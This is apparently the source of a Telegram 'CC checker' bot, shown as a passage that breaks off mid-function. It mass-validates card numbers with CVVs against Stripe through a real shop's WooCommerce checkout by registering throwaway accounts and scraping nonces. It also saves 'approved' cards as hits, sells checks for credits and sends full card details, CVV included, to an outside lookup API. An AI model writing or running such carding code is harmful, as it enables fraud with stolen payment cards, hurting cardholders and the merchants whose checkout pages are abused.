import asyncio
import re
import time
import json
import random
import html
import urllib.parse
from typing import Dict, Any, Optional, Tuple, List
from datetime import datetime
import os

# Import Telegram bot first
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.constants import ParseMode
from telegram.error import BadRequest

# Disable SSL warnings
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
warnings.filterwarnings("ignore", category=UserWarning)

# Import requests and urllib3 with compatibility fix
try:
    import urllib3
    import requests
    # Disable SSL warnings for urllib3
    try:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    except:
        pass
except ImportError:
    print("𝗘𝗥𝗥𝗢𝗥: 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗽𝗮𝗰𝗸𝗮𝗴𝗲𝘀 𝗻𝗼𝘁 𝗶𝗻𝘀𝘁𝗮𝗹𝗹𝗲𝗱.")
    print("𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝘂𝗻: 𝗽𝗶𝗽 𝗶𝗻𝘀𝘁𝗮𝗹𝗹 𝗿𝗲𝗾𝘂𝗲𝘀𝘁𝘀 𝘂𝗿𝗹𝗹𝗶𝗯𝟯 𝗽𝘆𝘁𝗵𝗼𝗻-𝘁𝗲𝗹𝗴𝗿𝗮𝗺-𝗯𝗼𝘁")
    exit(1)

from io import BytesIO
import sys

def print_banner():
    """Print banner for terminal output"""
    print("════════════════════════════════════════════════════════════════════════════════════════════")
    print("                 🤖 𝗗𝗨𝗔𝗟 𝗠𝗢𝗗𝗘 𝗖𝗖 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 - 𝗙𝗜𝗡𝗔𝗟 𝗕𝗨𝗜𝗟𝗗 𝘃𝟱.𝟬                     ")
    print("                                                                                          ")
    print("     🚀 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | $𝟭 𝗖𝗵𝗮𝗿𝗴𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 | 𝗔𝗱𝘃𝗮𝗻𝗰𝗲𝗱 𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽          ")
    print("     📊 𝗥𝗲𝗮𝗹-𝘁𝗶𝗺𝗲 𝗦𝘁𝗮𝘁𝘀 | 𝗔𝘂𝘁𝗼 𝗥𝗲𝘁𝗿𝗶𝗲𝘀 | 𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 | 𝗣𝗿𝗼𝗳𝗲𝘀𝘀𝗶𝗼𝗻𝗮𝗹 𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲")
    print("     💳 𝗖𝗿𝗲𝗱𝗶𝘁 𝗦𝘆𝘀𝘁𝗲𝗺 | 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 | 𝗨𝘀𝗲 𝗠𝗮𝗻𝗮𝗴𝗲𝗺𝗲𝗻𝘁 | 𝗟𝗼𝗰𝗮𝗹 𝗝𝗦𝗢𝗡 𝗗𝗮𝘁𝗮𝗯𝗮𝘀𝗲         ")
    print("     👤 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿: @𝗚𝗿𝗮𝗻𝗱𝗦𝗶𝗟𝗲𝘀 | 𝗔𝗱𝗺𝗶𝗻: @𝗠𝗱𝗦𝗮𝗺𝗶𝗿𝟮𝟬𝟬𝟬                              ")
    print("════════════════════════════════════════════════════════════════════════════════════════════")
    print()

# File paths for data storage
USERS_FILE = "users_data.json"
ADMINS_FILE = "admins.json"
TRANSACTIONS_FILE = "transactions.json"
HITS_FILE = "hits.json"

# Hardcoded configuration
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Replace with your bot token
ADMIN_ID = 1234567890  # Replace with your admin ID

class HitsManager:
    """Handle saving approved cards"""
    
    @staticmethod
    def load_hits():
        """Load hits from JSON file"""
        if os.path.exists(HITS_FILE):
            try:
                with open(HITS_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save_hits(hits_data):
        """Save hits to JSON file"""
        try:
            with open(HITS_FILE, 'w') as f:
                json.dump(hits_data, f, indent=4)
        except Exception as e:
            print(f"𝗘𝗿𝗿𝗼𝗿 𝘀𝗮𝘃𝗶𝗻𝗴 𝗵𝗶𝘁𝘀: {e}")
    
    @staticmethod
    def add_hit(user_id, username, card_data, mode):
        """Add an approved card to hits"""
        hits = HitsManager.load_hits()
        
        hit_id = f"HIT{int(time.time())}{random.randint(1000, 9999)}"
        
        hit = {
            "hit_id": hit_id,
            "user_id": user_id,
            "username": username,
            "card": card_data['original'],
            "card_number": card_data.get('number', ''),
            "exp_month": card_data.get('month', ''),
            "exp_year": card_data.get('year', ''),
            "cvv": card_data.get('cvv', ''),
            "bin": card_data.get('bin', ''),
            "mode": mode,
            "timestamp": datetime.now().isoformat()
        }
        
        if hit_id not in hits:
            hits[hit_id] = hit
            HitsManager.save_hits(hits)
            return True
        return False
    
    @staticmethod
    def get_user_hits(user_id):
        """Get all hits for a user"""
        hits = HitsManager.load_hits()
        user_hits = []
        
        for hit_id, hit_data in hits.items():
            if hit_data["user_id"] == user_id:
                user_hits.append(hit_data)
        
        return sorted(user_hits, key=lambda x: x["timestamp"], reverse=True)
    
    @staticmethod
    def get_all_hits():
        """Get all hits"""
        return HitsManager.load_hits()

class UserDatabase:
    """Handles user data storage and management"""
    
    @staticmethod
    def load_users():
        """Load users from JSON file"""
        if os.path.exists(USERS_FILE):
            try:
                with open(USERS_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save_users(users_data):
        """Save users to JSON file"""
        try:
            with open(USERS_FILE, 'w') as f:
                json.dump(users_data, f, indent=4)
        except Exception as e:
            print(f"𝗘𝗿𝗿𝗼𝗿 𝘀𝗮𝘃𝗶𝗻𝗴 𝘂𝘀𝗲𝗿𝘀: {e}")
    
    @staticmethod
    def load_admins():
        """Load admin users from JSON file"""
        if os.path.exists(ADMINS_FILE):
            try:
                with open(ADMINS_FILE, 'r') as f:
                    admins = json.load(f)
                    if str(ADMIN_ID) not in admins:
                        admins[str(ADMIN_ID)] = True
                        UserDatabase.save_admins(admins)
                    return admins
            except:
                return {str(ADMIN_ID): True}
        return {str(ADMIN_ID): True}
    
    @staticmethod
    def save_admins(admins_data):
        """Save admins to JSON file"""
        try:
            with open(ADMINS_FILE, 'w') as f:
                json.dump(admins_data, f, indent=4)
        except Exception as e:
            print(f"𝗘𝗿𝗿𝗼𝗿 𝘀𝗮𝘃𝗶𝗻𝗴 𝗮𝗱𝗺𝗶𝗻𝘀: {e}")
    
    @staticmethod
    def get_user(user_id):
        """Get user data by ID"""
        users = UserDatabase.load_users()
        if str(user_id) not in users:
            return None
        return users[str(user_id)]
    
    @staticmethod
    def create_user(user_id, username=None):
        """Create new user with default credits"""
        users = UserDatabase.load_users()
        user_id_str = str(user_id)
        
        if user_id_str not in users:
            is_admin = UserDatabase.is_admin(user_id)
            is_first_regular_user = False
            
            if not is_admin:
                regular_users_count = sum(1 for uid, u in users.items() if not UserDatabase.is_admin(int(uid)))
                is_first_regular_user = regular_users_count == 0
            
            users[user_id_str] = {
                "user_id": user_id,
                "username": username,
                "credits": 0,
                "created_at": datetime.now().isoformat(),
                "last_seen": datetime.now().isoformat(),
                "total_cards_checked": 0,
                "approved_cards": 0,
                "declined_cards": 0,
                "cvv_cards": 0,
                "ccn_cards": 0,
                "sessions": 0,
                "is_active": True,
                "pending_transaction": None,
                "free_checks_used": 0,
                "free_checks_available": 100 if is_first_regular_user and not is_admin else 0
            }
            UserDatabase.save_users(users)
            return users[user_id_str]
        return users[user_id_str]
    
    @staticmethod
    def update_user(user_id, updates):
        """Update user data"""
        users = UserDatabase.load_users()
        user_id_str = str(user_id)
        
        if user_id_str in users:
            users[user_id_str].update(updates)
            users[user_id_str]["last_seen"] = datetime.now().isoformat()
            UserDatabase.save_users(users)
            return True
        return False
    
    @staticmethod
    def add_credits(user_id, amount):
        """Add credits to user"""
        users = UserDatabase.load_users()
        user_id_str = str(user_id)
        
        if user_id_str in users:
            users[user_id_str]["credits"] = users[user_id_str].get("credits", 0) + amount
            UserDatabase.save_users(users)
            return users[user_id_str]["credits"]
        return None
    
    @staticmethod
    def deduct_credits(user_id, amount):
        """Deduct credits from user"""
        users = UserDatabase.load_users()
        user_id_str = str(user_id)
        
        if UserDatabase.is_admin(user_id):
            return 999999
            
        if user_id_str in users and users[user_id_str].get("credits", 0) >= amount:
            users[user_id_str]["credits"] -= amount
            UserDatabase.save_users(users)
            return users[user_id_str]["credits"]
        return None
    
    @staticmethod
    def get_all_users():
        """Get all users"""
        return UserDatabase.load_users()
    
    @staticmethod
    def is_admin(user_id):
        """Check if user is admin"""
        admins = UserDatabase.load_admins()
        return str(user_id) in admins
    
    @staticmethod
    def add_admin(user_id):
        """Add user as admin"""
        admins = UserDatabase.load_admins()
        admins[str(user_id)] = True
        UserDatabase.save_admins(admins)
        return True
    
    @staticmethod
    def remove_admin(user_id):
        """Remove user from admin"""
        admins = UserDatabase.load_admins()
        if str(user_id) in admins:
            del admins[str(user_id)]
            UserDatabase.save_admins(admins)
            return True
        return False
    
    @staticmethod
    def get_user_stats(user_id):
        """Get user statistics"""
        user = UserDatabase.get_user(user_id)
        if not user:
            return None
        
        stats = {
            "user_id": user_id,
            "username": user.get("username", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
            "credits": "𝗨𝗻𝗹𝗶𝗺𝗶𝘁𝗲𝗱" if UserDatabase.is_admin(user_id) else user.get("credits", 0),
            "created_at": user.get("created_at", "𝗨𝗻𝗸𝗻𝗼𝘄𝗻"),
            "total_cards_checked": user.get("total_cards_checked", 0),
            "approved_cards": user.get("approved_cards", 0),
            "declined_cards": user.get("declined_cards", 0),
            "cvv_cards": user.get("cvv_cards", 0),
            "ccn_cards": user.get("ccn_cards", 0),
            "sessions": user.get("sessions", 0),
            "is_active": user.get("is_active", True),
            "free_checks_available": user.get("free_checks_available", 0),
            "free_checks_used": user.get("free_checks_used", 0)
        }
        return stats

class TransactionManager:
    """Handle transaction records"""
    
    @staticmethod
    def load_transactions():
        """Load transactions from JSON file"""
        if os.path.exists(TRANSACTIONS_FILE):
            try:
                with open(TRANSACTIONS_FILE, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    @staticmethod
    def save_transactions(transactions):
        """Save transactions to JSON file"""
        try:
            with open(TRANSACTIONS_FILE, 'w') as f:
                json.dump(transactions, f, indent=4)
        except Exception as e:
            print(f"𝗘𝗿𝗿𝗼𝗿 𝘀𝗮𝘃𝗶𝗻𝗴 𝘁𝗿𝗮𝗻𝘀𝗮𝗰𝘁𝗶𝗼𝗻𝘀: {e}")
    
    @staticmethod
    def create_transaction(user_id, amount, trx_id=None, method=None):
        """Create a new transaction"""
        transactions = TransactionManager.load_transactions()
        
        transaction_id = f"TRX{int(time.time())}{random.randint(1000, 9999)}"
        
        transaction = {
            "transaction_id": transaction_id,
            "user_id": user_id,
            "amount": amount,
            "trx_id": trx_id,
            "method": method,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "completed_at": None
        }
        
        transactions[transaction_id] = transaction
        TransactionManager.save_transactions(transactions)
        
        UserDatabase.update_user(user_id, {"pending_transaction": transaction_id})
        
        return transaction
    
    @staticmethod
    def complete_transaction(transaction_id, trx_id=None, amount=None):
        """Mark transaction as completed"""
        transactions = TransactionManager.load_transactions()
        
        if transaction_id in transactions:
            transactions[transaction_id]["status"] = "completed"
            transactions[transaction_id]["completed_at"] = datetime.now().isoformat()
            if trx_id:
                transactions[transaction_id]["trx_id"] = trx_id
            if amount:
                transactions[transaction_id]["amount"] = amount
            
            TransactionManager.save_transactions(transactions)
            
            user_id = transactions[transaction_id]["user_id"]
            UserDatabase.update_user(user_id, {"pending_transaction": None})
            
            return True
        return False
    
    @staticmethod
    def get_transaction(transaction_id):
        """Get transaction by ID"""
        transactions = TransactionManager.load_transactions()
        return transactions.get(transaction_id)
    
    @staticmethod
    def get_user_transactions(user_id):
        """Get all transactions for a user"""
        transactions = TransactionManager.load_transactions()
        user_transactions = []
        
        for trx_id, trx_data in transactions.items():
            if trx_data["user_id"] == user_id:
                user_transactions.append(trx_data)
        
        return sorted(user_transactions, key=lambda x: x["created_at"], reverse=True)
    
    @staticmethod
    def find_transaction_by_trx_id(trx_id):
        """Find transaction by custom trx_id"""
        transactions = TransactionManager.load_transactions()
        for trx_data in transactions.values():
            if trx_data.get("trx_id") == trx_id and trx_data.get("status") == "pending":
                return trx_data
        return None

class BaseCCChecker:
    """Base class for common functionality"""
    def __init__(self):
        self.session = requests.Session()
        self.session.verify = False
        
        self.base_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua': '"Chromium";v="137", "Not/A?Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
        }
        
        self.session.headers.update(self.base_headers)
        
    def parse_card(self, card_line: str) -> Optional[Dict]:
        try:
            parts = card_line.strip().split('|')
            if len(parts) != 4:
                return None
                
            card_number = re.sub(r'\D', '', parts[0])
            exp_month = parts[1].zfill(2)
            exp_year = parts[2]
            cvv = parts[3]
            
            if len(exp_year) == 2:
                exp_year_full = '20' + exp_year
            elif len(exp_year) == 4:
                exp_year_full = exp_year
            else:
                return None
                
            if len(card_number) not in [15, 16]:
                return None
                
            return {
                'number': card_number,
                'month': exp_month,
                'year': exp_year_full,
                'cvv': cvv,
                'original': card_line.strip(),
                'short_year': exp_year_full[-2:],
                'bin': card_number[:6]
            }
        except:
            return None
    
    def generate_email(self) -> str:
        """Generate random email"""
        domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
        domain = random.choice(domains)
        return f"{name}@{domain}"
    
    def get_bin_info_from_binlist(self, bin_num):
        """Get BIN info from binlist.net"""
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        
        try:
            response = requests.get(f"https://lookup.binlist.net/{bin_num}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
            
            data = response.json()
            return {
                'country': data.get('country', {}).get('name', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'),
                'bank': data.get('bank', {}).get('name', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'),
                'scheme': data.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'),
                'type': data.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
            }
        except:
            return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
    
    def get_bin_info_from_bincheck(self, bin_num):
        """Get BIN info from bincheck.io"""
        headers = {
            'Referer': f'https://bincheck.io/details/{bin_num}',
            'Upgrade-Insecure-requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }
        
        try:
            response = requests.get(f"https://bincheck.io/details/{bin_num}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
            
            html = response.text
            
            pattern = r'<meta name="description" content="This number: \d+ is a valid BIN number (\w+) issued by ([^in]+) in ([^"]+)">'
            match = re.search(pattern, html)
            
            if match:
                bank = match.group(2)
                country = match.group(3)
                return {
                    'country': country.strip(),
                    'bank': bank.strip(),
                    'scheme': match.group(1),
                    'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'
                }
            
            country_match = re.search(r'<td[^>]*>Country</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            country = country_match.group(1) if country_match else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'
            
            bank_match = re.search(r'<td[^>]*>Bank</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            bank = bank_match.group(1) if bank_match else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'
            
            scheme_match = re.search(r'<td[^>]*>Card Brand</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            scheme = scheme_match.group(1) if scheme_match else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'
            
            type_match = re.search(r'<td[^>]*>Card Type</td>\s*<td[^>]*>([^<]+)</td>', html, re.IGNORECASE)
            card_type = type_match.group(1) if type_match else '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'
            
            return {
                'country': country.strip(),
                'bank': bank.strip(),
                'scheme': scheme.strip(),
                'type': card_type.strip()
            }
        except:
            return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
    
    def get_bin_info_from_antipublic(self, bin_num):
        """Get BIN info from antipublic.cc"""
        headers = {
            'Accept': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36'
        }
        
        try:
            response = requests.get(f"https://bins.antipublic.cc/bins/{bin_num}", headers=headers, timeout=5, verify=False)
            if response.status_code != 200:
                return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
            
            data = response.json()
            
            country = data.get('country_name', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
            bank = data.get('bank', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
            
            return {
                'country': country.strip(),
                'bank': bank.strip(),
                'scheme': data.get('scheme', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'),
                'type': data.get('type', '𝗨𝗻𝗸𝗻𝗼𝘄𝗻')
            }
            
        except:
            return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
    
    def get_bin_info(self, bin_num):
        """Get BIN information with fallback sources"""
        bin_num = str(bin_num)[:6]
        
        sources = [
            'antipublic',
            'bincheck',
            'binlist'  
        ]
        
        for source in sources:
            result = {}
            
            if source == 'antipublic':
                result = self.get_bin_info_from_antipublic(bin_num)
            elif source == 'bincheck':
                result = self.get_bin_info_from_bincheck(bin_num)
            elif source == 'binlist':
                result = self.get_bin_info_from_binlist(bin_num)
            
            if result.get('country') != '𝗨𝗻𝗸𝗻𝗼𝘄𝗻' and result.get('bank') != '𝗨𝗻𝗸𝗻𝗼𝘄𝗻':
                return result
            
            time.sleep(0.1)
        
        return {'country': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'bank': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'scheme': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻', 'type': '𝗨𝗻𝗸𝗻𝗼𝘄𝗻'}
    
    def extract_status_message(self, response_text: str) -> str:
        """Extract status message from payment method response"""
        try:
            if not response_text:
                return '𝗡𝗢_𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘'
                
            if response_text.strip().startswith('{'):
                response_json = json.loads(response_text)
                
                if 'error' in response_json:
                    error_data = response_json['error']
                    error_message = error_data.get('message', '')
                    error_code = error_data.get('code', '')
                    
                    if error_message:
                        return error_message
                    elif error_code:
                        return error_code
                    else:
                        return '𝗨𝗡𝗞𝗡𝗢𝗪𝗡_𝗘𝗥𝗥𝗢𝗥'
                
                if 'setup_intent' in response_json:
                    setup_intent = response_json['setup_intent']
                    status = setup_intent.get('status', '')
                    if status == 'succeeded':
                        return '𝗖𝗮𝗿𝗱 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆'
                    elif status == 'requires_action':
                        return '𝟯𝗗 𝗦𝗲𝗰𝘂𝗿𝗲 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱'
                    return status
                
                if 'status' in response_json:
                    return response_json['status']
                    
        except json.JSONDecodeError:
            pass
        except Exception as e:
            return f'𝗣𝗔𝗥𝗦𝗘_𝗘𝗥𝗥𝗢𝗥: {str(e)}'
            
        if response_text:
            return response_text[:100].replace('\n', ' ').strip()
        return '𝗡𝗢_𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘'
    
    def get_vbv_status(self, card_data: Dict) -> Optional[Dict]:
        """Get VBV status from API"""
        try:
            ccn = card_data['number']
            month = card_data['month']
            year = card_data['year']
            cvv = card_data['cvv']
            
            # Use year in 4-digit format
            api_url = f"https://unik-vbv.onrender.com//vbv/key/diwazz/cc={ccn}|{month}|{year}|{cvv}"
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            }
            
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            
            if response.status_code == 200:
                data = response.json()
                vbv_status = data.get('vbv_status', '')
                vbv_description = data.get('vbv_description', '')
                
                # Extract status from description
                if '3D FALSE' in vbv_status:
                    return {'status': '❌', 'description': '3D Authentication Failed'}
                elif '3D TRUE' in vbv_status:
                    return {'status': '✅', 'description': '3D Authentication Successful'}
                elif vbv_description:
                    return {'status': '🔒', 'description': vbv_description}
                else:
                    return {'status': '❓', 'description': 'Unknown VBV Status'}
            else:
                return {'status': '⚠️', 'description': 'API Error'}
                
        except Exception as e:
            return {'status': '⚠️', 'description': f'VBV Check Failed: {str(e)[:50]}'}
    
    def categorize_response(self, response_text: str, payment_method_response: str = None) -> Tuple[str, str, str]:
        """Categorize response with improved detection"""
        
        # First check payment method response for CVV/CCN errors
        if payment_method_response:
            try:
                if payment_method_response.strip().startswith('{'):
                    pm_json = json.loads(payment_method_response)
                    
                    if 'error' in pm_json:
                        error_data = pm_json['error']
                        error_message = error_data.get('message', '').lower()
                        error_code = error_data.get('code', '').lower()
                        param = error_data.get('param', '').lower()
                        
                        cvv_codes = ['invalid_cvc', 'incorrect_cvc', 'invalid_cvv', 'incorrect_cvv']
                        cvv_keywords = ['security code', 'cvc', 'cvv']
                        
                        ccn_codes = ['invalid_number', 'incorrect_number']
                        ccn_keywords = ['card number', 'invalid card']
                        
                        if (error_code in cvv_codes or 
                            any(kw in error_message for kw in cvv_keywords) or
                            param == 'cvc'):
                            return "𝗖𝗩𝗩", "✅", "𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗰𝗼𝗱𝗲 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱"
                        
                        if (error_code in ccn_codes or
                            any(kw in error_message for kw in ccn_keywords) or
                            param == 'number'):
                            return "𝗖𝗖𝗡", "✅", "𝗖𝗮𝗿𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱"
            except:
                pass
        
        response_lower = response_text.lower() if response_text else ""
        
        approved_keywords = [
            "succeeded", "payment-success", "successfully", "thank you for your support",
            "your card does not support this type of purchase", "thank you",
            "membership confirmation", "/wishlist-member/?reg=", "thank you for your payment",
            "thank you for membership", "payment received", "your order has been received",
            "purchase successful", "approved", "card authorized successfully"
        ]
        
        insufficient_keywords = [
            "insufficient funds", "insufficient_funds", "payment-successfully"
        ]

        declined_keywords = [
            "declined", "invalid", "failed", "error", "incorrect", "card was declined",
            "do_not_honor", "generic_decline"
        ]
        
        auth_keywords = [
            "mutation_ok_result", "requires_action", "requires_payment_method",
            "payment_intent.requires_confirmation", "requires_confirmation"
        ]

        ccn_cvv_keywords = [
            "incorrect_cvc", "invalid cvc", "invalid_cvc", "incorrect cvc", "incorrect cvv",
            "incorrect_cvv", "invalid_cvv", "invalid cvv", '"cvv_check": "pass"',
            "cvv_check: pass", "security code is invalid", "security code is incorrect",
            "zip code is incorrect", "zip code is invalid", "card is declined by your bank",
            "lost_card", "stolen_card", "transaction_not_allowed", "pickup_card"
        ]

        live_keywords = [
            "authentication required", "three_d_secure", "3d secure", "stripe_3ds2_fingerprint",
            "requires_action", "3d secure required"
        ]

        status_message = self.extract_status_message(response_text)
        
        if any(kw in response_lower for kw in approved_keywords):
            return "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗", "🔥", status_message
        elif any(kw in response_lower for kw in ccn_cvv_keywords):
            if 'security code' in response_lower or 'cvc' in response_lower or 'cvv' in response_lower:
                return "𝗖𝗩𝗩", "✅", "𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗰𝗼𝗱𝗲 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱"
            else:
                return "𝗖𝗖𝗡", "✅", "𝗖𝗮𝗿𝗱 𝗻𝘂𝗺𝗯𝗲𝗿 𝗶𝘀 𝗶𝗻𝘃𝗮𝗹𝗶𝗱"
        elif any(kw in response_lower for kw in declined_keywords):
            return "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗", "❌", status_message
        elif any(kw in response_lower for kw in live_keywords):
            return "𝟯𝗗 𝗟𝗜𝗩𝗘", "✅", status_message
        elif any(kw in response_lower for kw in insufficient_keywords):
            return "𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗙𝗨𝗡𝗗𝗦", "💰", status_message
        elif any(kw in response_lower for kw in auth_keywords):
            return "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛", "🔒", status_message
        else:
            return "𝗨𝗡𝗞𝗡𝗢𝗪𝗡", "❓", status_message

class StripeAuthChecker(BaseCCChecker):
    """Stripe Auth Checker"""
    def __init__(self):
        super().__init__()
        self.base_url = "https://lolaandveranda.com"
        self.setup_nonce = None
        self.session_created = False
        self.max_retries = 4
        self.retry_delay = 2
        
    def extract_register_nonce(self, html_content):
        """Extract woocommerce-register-nonce from HTML"""
        patterns = [
            r'id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="([a-f0-9]+)"',
            r'name="woocommerce-register-nonce" value="([a-f0-9]+)"',
            r'woocommerce-register-nonce["\']?\s*[:=]\s*["\']([a-f0-9]+)["\']',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content)
            if match:
                return match.group(1)
        return None
    
    def extract_wp_referer(self, html_content):
        """Extract _wp_http_referer from HTML"""
        pattern = r'name="_wp_http_referer" value="([^"]+)"'
        match = re.search(pattern, html_content)
        return match.group(1) if match else "/my-account/"
    
    def is_logged_in(self, html_content):
        """Check if registration was successful"""
        patterns = [
            r'woocommerce-MyAccount-navigation-link--dashboard',
            r'woocommerce-MyAccount-navigation-link--orders',
            r'woocommerce-MyAccount-navigation-link--payment-methods'
        ]
        return any(re.search(pattern, html_content) for pattern in patterns)
    
    def extract_nonce_multiple_methods(self, html_content):
        """Extract nonce using multiple methods"""
        methods = [
            self._extract_via_direct_pattern,
            self._extract_via_stripe_params,
            self._extract_via_json_script,
            self._extract_via_fallback_pattern
        ]
        
        for method in methods:
            nonce = method(html_content)
            if nonce:
                return nonce
        return None
    
    def _extract_via_direct_pattern(self, html):
        pattern = r'"createAndConfirmSetupIntentNonce":"([a-f0-9]{10})"'
        match = re.search(pattern, html)
        return match.group(1) if match else None
    
    def _extract_via_stripe_params(self, html):
        pattern = r'var\s+wc_stripe_params\s*=\s*({[^}]+})'
        match = re.search(pattern, html)
        if match:
            try:
                json_str = match.group(1)
                json_str = re.sub(r',\s*}', '}', json_str)
                data = json.loads(json_str)
                return data.get('createAndConfirmSetupIntentNonce')
            except:
                pass
        return None
    
    def _extract_via_json_script(self, html):
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL)
        
        for script in scripts:
            if 'createAndConfirmSetupIntentNonce' in script:
                json_pattern = r'\{[^}]*(?:createAndConfirmSetupIntentNonce[^}]*)+[^}]*\}'
                json_matches = re.findall(json_pattern, script)
                for json_str in json_matches:
                    try:
                        clean_json = json_str.replace("'", '"')
                        data = json.loads(clean_json)
                        if 'createAndConfirmSetupIntentNonce' in data:
                            return data['createAndConfirmSetupIntentNonce']
                    except:
                        continue
        return None
    
    def _extract_via_fallback_pattern(self, html):
        patterns = [
            r'createAndConfirmSetupIntentNonce["\']?\s*:\s*["\']([a-f0-9]{10})["\']',
